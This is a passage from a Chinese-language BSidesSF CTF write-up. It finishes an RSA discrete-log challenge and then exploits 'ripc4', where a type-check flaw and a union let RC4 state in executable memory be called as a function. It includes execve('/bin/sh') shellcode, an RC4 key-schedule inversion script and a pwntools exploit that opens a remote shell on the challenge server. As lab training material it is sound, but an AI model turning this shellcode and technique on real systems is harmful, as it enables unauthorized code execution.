            if is_prime(p):
                return p
    p = gen_vuln_q(2048)
得到一个符号条件的p如下：
    sage: p
    69348678866401304646490861340488561209226208451247619560874232340522178522111420961377229336150730880601133592524865851877831525814035741486668086205630811245258303788413634402005343871975262971764271596537208390881585388826538775299782515845855434406453667832544367299838240312836787198396118023980826377214570894061698419474293116477944531505679841702722019141788605828099179561946772093405337285309388291218510467722727587855439951363274502690753768059113924778573772147525576971356709382759100623217498271818843999443100287933304890357765393645527454524195055115747125096835625303998708821171598429576886050671607
接下来使用Sage下的discrete_log函数来计算离散对数，discrete_log函数使用Pohlig-Hellman算法和Baby step
giant step算法来进行计算：
    sage: e = discrete_log(Mod(ct,n),Mod(pt,n))
    sage: e
    36422352138476438909832496849456056084223678523869861209732908151440385123660161504869087755529534644398623699223414430780281764394590301670060005120616912686826197155766762502748616239180854689739776032890835376617273391687494656841086881359810323550417111353865033903912885540415255335166833611689772579230278145479515702771128469846795665013650092070277562327414903956978470113728144176048547997703413968349297818655990813736343030149257242963123900351837101871161825265263358353871479880311787277055886314582993076682661974519235759945922631610206861269106514465703633782653326906936013250902786022123542647753639
接下来依次使用setp、setq和sete命令设置p、q、e：
    RSA debugger> setp 2
    RSA debugger> setq 69348678866401304646490861340488561209226208451247619560874232340522178522111420961377229336150730880601133592524865851877831525814035741486668086205630811245258303788413634402005343871975262971764271596537208390881585388826538775299782515845855434406453667832544367299838240312836787198396118023980826377214570894061698419474293116477944531505679841702722019141788605828099179561946772093405337285309388291218510467722727587855439951363274502690753768059113924778573772147525576971356709382759100623217498271818843999443100287933304890357765393645527454524195055115747125096835625303998708821171598429576886050671607
    RSA debugger> sete 36422352138476438909832496849456056084223678523869861209732908151440385123660161504869087755529534644398623699223414430780281764394590301670060005120616912686826197155766762502748616239180854689739776032890835376617273391687494656841086881359810323550417111353865033903912885540415255335166833611689772579230278145479515702771128469846795665013650092070277562327414903956978470113728144176048547997703413968349297818655990813736343030149257242963123900351837101871161825265263358353871479880311787277055886314582993076682661974519235759945922631610206861269106514465703633782653326906936013250902786022123542647753639
使用printkey命令查看密钥设置情况：
    RSA debugger> printkey
    Current key parameters:
     p: 2
     q: 69348678866401304646490861340488561209226208451247619560874232340522178522111420961377229336150730880601133592524865851877831525814035741486668086205630811245258303788413634402005343871975262971764271596537208390881585388826538775299782515845855434406453667832544367299838240312836787198396118023980826377214570894061698419474293116477944531505679841702722019141788605828099179561946772093405337285309388291218510467722727587855439951363274502690753768059113924778573772147525576971356709382759100623217498271818843999443100287933304890357765393645527454524195055115747125096835625303998708821171598429576886050671607
     derived n: 138697357732802609292981722680977122418452416902495239121748464681044357044222841922754458672301461761202267185049731703755663051628071482973336172411261622490516607576827268804010687743950525943528543193074416781763170777653077550599565031691710868812907335665088734599676480625673574396792236047961652754429141788123396838948586232955889063011359683405444038283577211656198359123893544186810674570618776582437020935445455175710879902726549005381507536118227849557147544295051153942713418765518201246434996543637687998886200575866609780715530787291054909048390110231494250193671250607997417642343196859153772101343214
     e: 36422352138476438909832496849456056084223678523869861209732908151440385123660161504869087755529534644398623699223414430780281764394590301670060005120616912686826197155766762502748616239180854689739776032890835376617273391687494656841086881359810323550417111353865033903912885540415255335166833611689772579230278145479515702771128469846795665013650092070277562327414903956978470113728144176048547997703413968349297818655990813736343030149257242963123900351837101871161825265263358353871479880311787277055886314582993076682661974519235759945922631610206861269106514465703633782653326906936013250902786022123542647753639
     derived d: 11475848161585851629376650407886562187002415489835600751223818333328068256905082663238149764303518192249979414510783083253980314559553095775311658553805767975390498204663534961681184075235339403546359714841235203209540488076625909297051171968846712421948345710805255200457376468164017672950810241674429278554209670559485983713596396455747422052964240878233874195729576610359168370008579693321133791460169576474473764534490140203756337986331651433430663907083311784790492839865895207358760352678805011242690418079655527095574378481710864733615938649622850037212546379720199123669151033788173336550340807463002532173153
可以看到参数设置无误，使用testdecrypt命令查看此时解密后的m的值是否和printtarget命令展示的m的值一致：
    52218557622655182058721298410128724497736237107858961398752582948746717509543923532995392133766377362569697253085889
可以看到两处值一致，即我们成功完成了本题的任务，接下来使用attack命令即可得到flag：
    RSA debugger> attack
    Satellite response: CTF{curveball_not_just_for_ecc}
## ripc4
题目描述：  
[@TODO](https://github.com/TODO "@TODO") symmetric  
ripc4-42d6573e.challenges.bsidessf.net:8267
题目附件：  
[ripc4](https://github.com/ichunqiu-resources/anquanke/blob/master/009/ripc4/ripc4)  
[ripc4.c](https://github.com/ichunqiu-resources/anquanke/blob/master/009/ripc4/ripc4.c)
本题给出了服务器的地址和端口，同时给出了服务器端运行着的binary及其源码，该binary提供了三组模式，分别是明文模式、编码模式和加密模式：
    type (plain, encoded, encrypted)>
每个模式提供的命令如下：
    #plain
    type (plain, encoded, encrypted)> plain
    set_input   : Set the input value
    print       : Print the output value
    quit        : Quit the Program
    command>
    #encoded
    type (plain, encoded, encrypted)> encoded
    set_input   : Set the input value
    print       : Print the output value
    set_encoding: Set the encoding scheme.
    quit        : Quit the Program
    command>
    #encrypted
    type (plain, encoded, encrypted)> encrypted
    set_input   : Set the input value
    set_key     : Set the RC4 key.
    encrypt     : Perform encryption.
    quit        : Quit the Program
    command>
其中编码模式可以选择使用base64或hex方式进行编码，加密模式会使用RC4进行加密，可以看到明文模式和编码模式的界面都显示了print命令，但encrypted模式没有，但是审计源码我们可以发现程序在判断用户输入的命令是print后并没有继续判断当前处于什么模式，因此我们在加密模式下仍然可以执行print命令，print命令会调用print_state函数，我们来看一下该函数：
    void print_state(workspace_t *ws) {
      if (CHECK_TYPE(ws, TYPE_ENCODE)) {
        if (!ws->print_encoded) {
          printf("Must use set_encoding first.n");
          return;
        }
        ws->print_encoded(ws->input_buf, ws->buf_len);
      } else if (CHECK_TYPE(ws, TYPE_PLAIN)) {
        printf("%sn", ws->input_buf);
      } else {
        printf("Printing not supported for encrypted data.n");
      }
    }
print_state函数首先会试图通过CHECK_TYPE(ws,
TYPE_ENCODE)来判断当前是否处于编码模式，但是这里存在一个问题，我们查看一下CHECK_TYPE的宏定义：
    #define CHECK_TYPE(ws, t) ((ws->type & t) == t)
可以看到它是根据((ws->type & t) == t)的结果来判断当前所处的模式，这里程序的三种模式的宏定义如下：
    #define TYPE_PLAIN 1
    #define TYPE_ENCODE 2
    #define TYPE_ENCRYPT 3
那么当我们选择加密模式后，ws->type会被设置为3，print_state函数在使用CHECK_TYPE(ws,
TYPE_ENCODE)时，会计算3&2是否等于2，而显然这里是相等的，因此我们在加密模式下调用print_state函数时会进入到第一个编码模式为True的分支中。我们继续来看一下，进入到该分支之后，程序会判断!ws->print_encoded是否为True，即ws->print_encoded是否被设置了内容，如果没有被设置过的话程序就会打印提示语句并退出，但是我们审计代码会发现，ws->print_encoded只在set_encoding中被设置过，但是set_encoding需要在编码模式下才能调用，我们现在是在加密模式，因此我们需要想办法寻找其他方式来设置ws->print_encoded。
由于ws是workspace_t结构体变量，我们回到workspace_t结构体本身来看一下：
    typedef struct {
      int type;
      char *input_buf;
      size_t buf_len;
      union {
        void (*print_encoded)(const char *, size_t);
        char *enc_state;
      };
    } workspace_t;
可以看到print_encoded函数和enc_state是写在联合体union当中的，由于union当中几个不同类型的变量共占一段内存，因此会出现相互覆盖的问题，即如果我们设置了enc_state，同样能过掉!ws->print_encoded这一check，这样一来，在ws->print_encoded(ws->input_buf,
ws->buf_len)时，程序就会跳到states处执行，因此如果我们可以将256字节的states设置为shellcode，就可以在加密模式下执行print命令来执行shellcode，因此我们接下来查看一下如何设置enc_state。
审计代码可知set_key函数可以设置enc_state，set_key函数首先调用secure_malloc函数来为enc_state分配256字节的空间，我们查看secure_malloc函数可以发现函数以PROT_RW方式分配存储页，而PROT_RW在宏定义处设置为(PROT_MASK|PROT_READ|PROT_WRITE)，而PROT_MASK又设置为(PROT_READ|PROT_WRITE|PROT_EXEC)，即我们分配的页面是可写、可读可执行的。
分配完空间后接下来对enc_state进行初始化，在set_key函数中我们可以看到RC4的states在初始化时是对256个字节依次赋值x00到xff，随后该states只经历了置换运算，没有经历代换运算，因此states中的256个字节是互不相同的，也就意味着我们的shellcode中的每个字节只能出现一次。但是我们这里想要执行shellcode的话，’/bin/sh’中包含了两个’/‘，出现了相同字节，所以我们需要调整一下shellcode（当然也可以采用多级shellcode的方式）：
    00000000  31F6              xor esi,esi
    00000002  56                push esi
    00000003  48                dec eax
    00000004  BB2E62696E        mov ebx,0x6e69622e
    00000009  2F                das
    0000000A  7368              jnc 0x74
    0000000C  0080CB015354      add [eax+0x545301cb],al
    00000012  5F                pop edi
    00000013  F7EE              imul esi
    00000015  B03B              mov al,0x3b
    00000017  0F05              syscall
由于我们输入的内容是key，因此我们可以写一个脚本来计算一下，当输入什么样的key时，程序中的states会恰好变成我们构造的shellcode。
我们从RC4的密钥调度部分入手，RC4的密钥调度算法如下：
    def key_scheduling(key):
        j = 0
        state = range(256)
        for i in range(256):
            j = (j + state[i] + key[i % 256]) & 0xff
            state[i], state[j] = state[j], state[i]
        return state
根据该算法我们可以写出该算法的逆算法：
    def reverse_key_scheduling(state):
        init = range(256)
        key = []
        j = 0
        for i in range(256):
            idx = init.index(state[i])
            last_j = j
            key.append((idx + 1024 - j - init[i]) & 0xff)
            j = idx & 0xff
            assert (last_j + init[i] + key[-1] & 0xff == j)
            init[i], init[j] = init[j], init[i]
        return key
根据该逆算法我们可以写出由shellcode（即state）求key的脚本如下：
    #!/usr/bin/env python
    import random
    from Crypto.Util.number import *
    def reverse_key_scheduling(state):
        init = range(256)
        key = []
        j = 0
        for i in range(256):
            idx = init.index(state[i])
            last_j = j
            key.append((idx + 1024 - j - init[i]) & 0xff)
            j = idx & 0xff
            assert (last_j + init[i] + key[-1] & 0xff == j)
            init[i], init[j] = init[j], init[i]
        return key
    state = range(256)
    shellcode = '31f65648bb2e62696e2f73680080cb0153545ff7eeb03b0f05'
    shellcode = map(bytes_to_long, list(shellcode.decode('hex')))
    for i in shellcode:
       state.remove(i)
    random.shuffle(state)
    state = shellcode + state
    key = reverse_key_scheduling(state)
    print ''.join([i.replace('0x', '').zfill(2) for i in (map(hex, key))])
有了key之后，我们可以写exp如下：
    from pwn import *
    r = remote('ripc4-42d6573e.challenges.bsidessf.net', 8267)
    #使用上面的脚本所生成的一个key
    key = '31c45eef6f6e2e00fdb83aeabd423d1c4df0f985e3ad75a42061ab2dc00fdc78257114ee0a035e1984590f2a0ab64f9d5156679b4d0cb0f9017ad0f88142a2a5f988d1e6a7e7810cb6f8d8a86df1cbb9ca57f30377ab49812a6960d7391ee0a517a0dfb79232cd18d196a89d9abc497abd68e4fc571eea6fd664aa47a1dd99b1c69601806034e829437ea985bf4e9216b30315207a6911636c83a07b736eb8688b56310054993160b9bcabc82a6d37d9188b6823bb9f9886ee3477956923c8fa2249603d746a25569db2bc89423fb7767494b7c92ac92c5c9699a1be4eceb618b7ea1b40445ee7ae0ce0b7c2e4175bcbc817301fb7bfe62c1c5f5f412a2d2d2c'
    r.sendline('encrypted')
    r.sendline('set_key')
    r.sendline(key)
    r.sendline('print')
    r.interactive()
执行exp即可拿到shell，从而得到flag：
    CTF{R.I.P_RC4_u_were_fun_while_it_lasted}
## 参考
[https://docs.microsoft.com/en-us/windows/win32/seccrypto/example-c-program–importing-a-plaintext-key](https://docs.microsoft.com/en-us/windows/win32/seccrypto/example-c-program--importing-a-plaintext-key)  